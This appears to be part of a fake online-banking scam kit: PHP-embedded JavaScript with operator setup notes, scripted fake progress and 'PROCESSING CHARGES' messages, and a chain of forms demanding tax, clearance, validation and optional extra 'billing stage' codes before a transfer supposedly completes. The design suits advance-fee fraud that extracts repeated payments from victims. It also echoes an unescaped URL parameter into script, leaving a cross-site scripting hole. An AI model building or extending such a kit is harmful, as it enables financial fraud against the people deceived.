splashmessage[19]='90%.......OF TRANSFER COMPLETED'
splashmessage[20]='91%.......OF TRANSFER COMPLETED'
splashmessage[21]='92%.......OF TRANSFER COMPLETED'
splashmessage[22]='93%.......OF TRANSFER COMPLETED'
splashmessage[23]='94%.......OF TRANSFER COMPLETED'
splashmessage[24]='95%.......OF TRANSFER COMPLETED'
splashmessage[25]='PROCESSING CHARGES....'
splashmessage[26]='PROCESSING ALL CHARGES......'
splashmessage[27]='95%.......OF TRANSFER COMPLETED'
splashmessage[28]='PLEASE WAIT...'
splashmessage[29]='PLEASE WAIT....'
splashmessage[30]='96%.......OF TRANSFER COMPLETED'
splashmessage[31]='97%.......OF TRANSFER COMPLETED'
splashmessage[32]='97%.......OF TRANSFER COMPLETED'
var closingtags='</font>'
    
    
    
    
    
    
// FINAL STAGE     complete-transfer       complete_transfer.php    97-100  
    var targetdestination="transfer-info?trans_id=<?php echo $_GET['trans_id']; ?>&fb=finalizing transfer & creating portal space&edb=9003003993mnhd9389893493"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER..............'
splashmessage[2]='PLEASE WAIT.........................'
splashmessage[3]='YOUR TRANSFER IS NOW BEING COMPLETED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <?php echo "$site_name";?> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]= '97%.......OF TRANSFER COMPLETED'
splashmessage[7]='98%.......OF TRANSFER COMPLETED'
splashmessage[8]='100%.......OF TRANSFER COMPLETED'
splashmessage[9]='100%.......OF TRANSFER COMPLETED'
splashmessage[10]='100%.......OF TRANSFER COMPLETED'
splashmessage[11]='100%.......OF TRANSFER COMPLETED'
splashmessage[12]='100%.......OF TRANSFER COMPLETED'
splashmessage[13]='TRANSFERING FUNDS....'
splashmessage[14]='CLEARING HISTORY..........'
splashmessage[15]='FUNDS SUCCESSFULLY TRANSFERED'
var closingtags='</font>'
    
    
    
    
    
   /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////JS//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
    
    STAGE 4 
    // REPLACE .js transfer fuction   WITH THE BELLOW   locattion   things/js/bank/script.php     start from   line 77-282    replace with bellow
    
    
    
    JS  
    
    
    
    

function startTransfer(){
$('#formTransfer').submit(function(){
				$('.btnTrans').prop('disabled', true);
	    		$('.btnTrans').html("<img src='../img/preloader.gif' width='32' height='32'>");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'login.php?action=Start transfer',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
	    $('.btnTrans').html("Restart Transfer");
		$('.errorInfo').show(500);
		$('.errorInfo').html("Insufficient funds, please contact your bank for more information");
	   }else{
		window.location="transfer-process?transID="+returndata;
		}
	
	}
  });
				return false;	  
					  });
}

function confirmCode(){
$('#confirmCOde').submit(function(){
				$('.btnCod').prop('disabled', true);
	    		$('.btnCod').html("Processing........");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'login.php?action=Confirm Code',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="transfer-funds?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}

function confirmTax(){
$('#confirmTax').submit(function(){
				$('.btnTax').prop('disabled', true);
	    		$('.btnTax').html("Processing........");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'login.php?action=Confirm Tax',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="finalizing-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}

function confirmClearance(){
$('#clearanceCode').submit(function(){
				$('.btnCle').prop('disabled', true);
	    		$('.btnCle').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'login.php?action=Confirm Clearance',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="transfer-validation?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}



function lastConfirmation(){
$('#ValidationCode').submit(function(){
				$('.btnVal').prop('disabled', true);
	    		$('.btnVal').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'login.php?action=Confirm Validation',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="complete-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}



// NOT APPLICABLE ECEPT YOU NEED 5TH BILLING STAGE    THEN YOU MOVE  "complete-transfer?trans_id" AND PUT THE NEXT STAGE ON LINE 234 ABOVE
function fifthStageCOnfirm(){
$('#xtremeValidation').submit(function(){
				$('.btnXtr').prop('disabled', true);
	    		$('.btnXtr').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'login.php?action=Confirm xtreme stage',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
		$('.errorInfo').delay(5000).fadeOut('slow');
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="complete-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}


